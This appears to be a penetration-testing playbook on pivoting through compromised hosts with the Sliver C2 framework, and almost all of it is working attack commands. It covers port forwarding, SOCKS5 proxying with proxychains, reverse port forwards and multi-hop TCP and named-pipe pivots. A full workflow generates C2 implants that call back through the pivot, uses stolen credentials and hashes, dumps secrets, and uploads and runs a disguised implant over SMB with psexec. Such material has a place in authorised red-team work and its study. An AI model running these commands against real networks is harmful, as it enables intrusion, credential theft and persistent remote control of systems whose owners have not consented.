# Sliver Pivoting & Network Tunneling

## Overview

Reach internal networks through compromised hosts using Sliver's built-in
pivoting capabilities. After establishing a C2 session on a dual-homed host,
use port forwarding, SOCKS5 proxying, and named pipe pivots to scan, enumerate,
and exploit hosts on internal segments that aren't directly reachable.

## Pivot Decision Tree

```
C2 Session Established on Boundary Host
├── Need to access specific internal service?
│   └── Port Forward (portfwd add)
├── Need full network access?
│   └── SOCKS5 Proxy (socks5 start) + proxychains
├── Need internal hosts to reach Kali?
│   └── Reverse Port Forward (rportfwd add)
└── Need to chain through multiple hosts?
    └── Named Pipe Pivot / TCP Pivot
```

## Method 1: Port Forwarding (Single Service)

Best for targeting a specific internal service (SMB, RDP, HTTP, SSH).

```bash
# Forward internal SMB to local port
sliver [session] > portfwd add \
  --remote <INTERNAL_HOST>:445 \
  --bind 127.0.0.1:8445

# Forward internal RDP
sliver [session] > portfwd add \
  --remote <INTERNAL_HOST>:3389 \
  --bind 127.0.0.1:13389

# Forward internal web server
sliver [session] > portfwd add \
  --remote <INTERNAL_HOST>:80 \
  --bind 127.0.0.1:8080

# Forward internal SSH
sliver [session] > portfwd add \
  --remote <INTERNAL_HOST>:22 \
  --bind 127.0.0.1:2222

# Forward internal MySQL
sliver [session] > portfwd add \
  --remote <INTERNAL_HOST>:3306 \
  --bind 127.0.0.1:13306

# List active forwards
sliver [session] > portfwd list

# Remove a forward
sliver [session] > portfwd rm --id <FORWARD_ID>
```

### Using Port Forwards from Kali

```bash
# Access internal SMB through forward
crackmapexec smb 127.0.0.1 --port 8445 -u admin -p Password123
smbclient //127.0.0.1/C$ -p 8445 -U admin%Password123

# Access internal RDP
xfreerdp /v:127.0.0.1:13389 /u:admin /p:Password123

# Access internal web
curl http://127.0.0.1:8080/
nikto -h http://127.0.0.1:8080/

# Access internal SSH
ssh -p 2222 admin@127.0.0.1

# Access internal MySQL
mysql -h 127.0.0.1 -P 13306 -u root -p
```

## Method 2: SOCKS5 Proxy (Full Network)

Best for scanning entire internal subnets or accessing multiple services.

```bash
# Start SOCKS5 proxy through session
sliver [session] > socks5 start --port 1080

# Stop SOCKS proxy
sliver [session] > socks5 stop --id <PROXY_ID>
```

### Configure Proxychains

```bash
# Edit proxychains config
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Or use a custom config
cat > /tmp/pivot_proxychains.conf << 'EOF'
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
EOF
```

### Using Proxychains

```bash
# Scan internal network (TCP only — no SYN scans through SOCKS)
proxychains nmap -sT -Pn -n 10.0.0.0/24 -p 22,80,445,3389 --open

# Targeted service scan
proxychains nmap -sT -Pn -n -sV 10.0.0.5 -p 1-1000

# CrackMapExec through pivot
proxychains crackmapexec smb 10.0.0.0/24 -u admin -p Password123

# Evil-WinRM through pivot
proxychains evil-winrm -i 10.0.0.5 -u admin -p Password123

# SSH through pivot
proxychains ssh admin@10.0.0.5

# Web requests through pivot
proxychains curl http://10.0.0.5/
proxychains gobuster dir -u http://10.0.0.5/ -w /usr/share/wordlists/dirb/common.txt

# SQLMap through pivot
proxychains sqlmap -u "http://10.0.0.5/page?id=1" --batch

# Impacket through pivot
proxychains impacket-psexec admin:Password123@10.0.0.5
proxychains impacket-secretsdump admin:Password123@10.0.0.5
```

### SOCKS Performance Notes

- **TCP only** — SOCKS doesn't support ICMP or UDP natively
- **Use -sT** for nmap (connect scan, not SYN scan)
- **Use -Pn** to skip ping (ICMP doesn't work through SOCKS)
- **Scanning is slower** than direct — use targeted port lists
- **Timeouts** may need increasing for slow internal networks

## Method 3: Reverse Port Forward (Inbound)

Expose a Kali service to the target's internal network. Useful for:
- Hosting a web server for payload delivery to internal hosts
- Running a listener for callbacks from internal hosts

```bash
# Expose Kali's port 80 on compromised host's port 8080
sliver [session] > rportfwd add \
  --remote 0.0.0.0:8080 \
  --bind 127.0.0.1:80

# Now internal hosts can reach Kali's web server via:
#   http://<compromised_host>:8080/

# Expose Kali's Sliver listener for internal implant callbacks
sliver [session] > rportfwd add \
  --remote 0.0.0.0:8888 \
  --bind 127.0.0.1:8888

# Generate internal implant that calls back through the pivot
sliver > generate --mtls <COMPROMISED_HOST_INTERNAL_IP>:8888 \
  --os windows --arch amd64 --save /tmp/internal_implant.exe
```

## Method 4: Named Pipe / TCP Pivot (Multi-Hop)

Chain through multiple compromised hosts without direct connectivity.

```bash
# On the first compromised host, start a pivot listener
sliver > pivots tcp --bind 0.0.0.0:9898 --session <SESSION_1_ID>

# Generate implant for the SECOND hop that connects through the first
sliver > generate --tcp-pivot <HOST_1_INTERNAL_IP>:9898 \
  --os windows --arch amd64 --save /tmp/hop2_implant.exe

# Deliver hop2 implant to the second target via lateral movement
# When it calls back, it routes through Host 1 → Kali

# For Windows named pipe pivot (stealthier — no TCP port opened)
sliver > pivots named-pipe --bind "\\\\.\\pipe\\ntsvcs" --session <SESSION_1_ID>

# Generate implant that connects via named pipe
sliver > generate --named-pipe <HOST_1_HOSTNAME>/ntsvcs \
  --os windows --arch amd64 --save /tmp/pipe_implant.exe
```

## Pivoting Workflow (Complete Example)

### Scenario: Compromise boundary host → scan internal → exploit internal

```bash
# 1. You have a session on 192.168.1.10 (dual-homed: also on 10.0.0.0/24)
sliver > use <SESSION_ID>

# 2. Discover internal network
sliver [session] > ifconfig
# Output shows: eth1 10.0.0.10/24

# 3. Start SOCKS proxy for internal scanning
sliver [session] > socks5 start --port 1080

# 4. Scan internal subnet
proxychains nmap -sT -Pn -n 10.0.0.0/24 -p 22,80,445,3389,5985 --open -oN /tmp/internal_scan.txt

# 5. Find: 10.0.0.5 has SMB open. Port-forward it for exploitation
sliver [session] > portfwd add --remote 10.0.0.5:445 --bind 127.0.0.1:8445

# 6. Exploit internal SMB with stolen creds
crackmapexec smb 127.0.0.1 --port 8445 -u admin -H <NTLM_HASH> --shares

# 7. Set up reverse port forward for internal implant delivery
sliver [session] > rportfwd add --remote 0.0.0.0:9999 --bind 127.0.0.1:8888

# 8. Generate implant for internal host that calls back through pivot
sliver > generate --mtls 10.0.0.10:9999 --os windows --arch amd64 \
  --save /tmp/internal_implant.exe

# 9. Deliver and execute via SMB
smbclient //127.0.0.1/C$ -p 8445 -U admin%Password123 -c \
  "put /tmp/internal_implant.exe Windows\\Temp\\svc.exe"
impacket-psexec admin:Password123@127.0.0.1 -port 8445 \
  "C:\\Windows\\Temp\\svc.exe"

# 10. Second session arrives — now you have C2 on the internal host
sliver > sessions
```

## Cleanup

```bash
# Remove all port forwards
sliver [session] > portfwd list
sliver [session] > portfwd rm --id <ID>

# Stop SOCKS proxies
sliver [session] > socks5 stop --id <ID>

# Remove reverse port forwards
sliver [session] > rportfwd rm --id <ID>

# Remove pivot listeners
sliver > pivots list
sliver > pivots stop --id <ID>
```

## Evidence Collection

- All port forward configurations (source:port → dest:port)
- SOCKS proxy session details
- Internal network scan results
- Lateral movement commands and proof
- Multi-hop pivot topology diagram
- Cleanup confirmation
